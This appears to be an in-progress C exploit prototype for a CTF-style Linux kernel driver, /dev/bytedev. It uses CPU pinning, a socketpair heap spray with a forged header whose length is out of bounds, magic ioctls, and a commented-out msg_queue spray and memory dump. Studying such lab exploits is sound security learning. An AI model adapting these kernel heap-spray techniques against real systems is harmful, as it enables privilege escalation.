#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>

struct bytedev_data {
    unsigned short len, offset;
    char data[0];
};

#define BYTEDEV_BUF_SIZE (4096 - sizeof(struct bytedev_data))

void errExit(char * msg)
{
    printf("\033[31m\033[1m[x] Error : \033[0m%s\n", msg);
    exit(EXIT_FAILURE);
}

size_t buf1[0x5000];
size_t buf2[0x5000];

int main(int argc, char **argv, char **envp)
{
    int dev_fd, res, msqid;
    int sk_sockets[2];
    struct bytedev_data *fake_data;
    cpu_set_t   cpu_set;

    if ((dev_fd = open("/dev/bytedev", O_RDWR)) < 0) {
        errExit("failed to open bytedev!");
    }

    /* to run the exp on the specific core only */
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    memset(buf1, 'A', 0x4000);
    memset(buf2, 'Y', 0x4000);

    printf("write %d bytes\n", write(dev_fd, buf1, BYTEDEV_BUF_SIZE));
    printf("read %d bytes\n", read(dev_fd, buf1, BYTEDEV_BUF_SIZE));

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets) < 0) {
        errExit("failed to create socket pair!");
    }

    fake_data = malloc(sizeof(struct bytedev_data) + BYTEDEV_BUF_SIZE);
    fake_data->len = BYTEDEV_BUF_SIZE + 1;
    fake_data->offset = 0xdead;
    memset(fake_data->data, 'Z', BYTEDEV_BUF_SIZE);
    
    puts("write to socket...");
    write(sk_sockets[0], fake_data, BYTEDEV_BUF_SIZE - 400);
    puts("done!");

    ioctl(dev_fd, 0x66666666);
    write(dev_fd, buf2, BYTEDEV_BUF_SIZE);

    /*if ((msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0) {
        errExit("failed to alloc a msg_queue!");
    }
    buf1[0] = *(size_t*)"arttnba3";
    msgsnd(msqid, buf1, 0x1500, 0);

    write(dev_fd, buf1, BYTEDEV_BUF_SIZE);

    puts("[*] start receiving msg...");
    msgrcv(msqid, buf2, 0x1500, *(size_t*)"arttnba3", 0);
    puts("[+] done!");
    memset(buf2, 'Y', 0x4000);ioctl(dev_fd, 0xdeadbeef, buf2);

    for (int i = 0; i < BYTEDEV_BUF_SIZE/8; i++) {
        if (i % 8 == 0) {
            printf("\n[----data dump----] ");
        }
        printf("%llx ", buf2[i]);
    }*/

    return 0;
}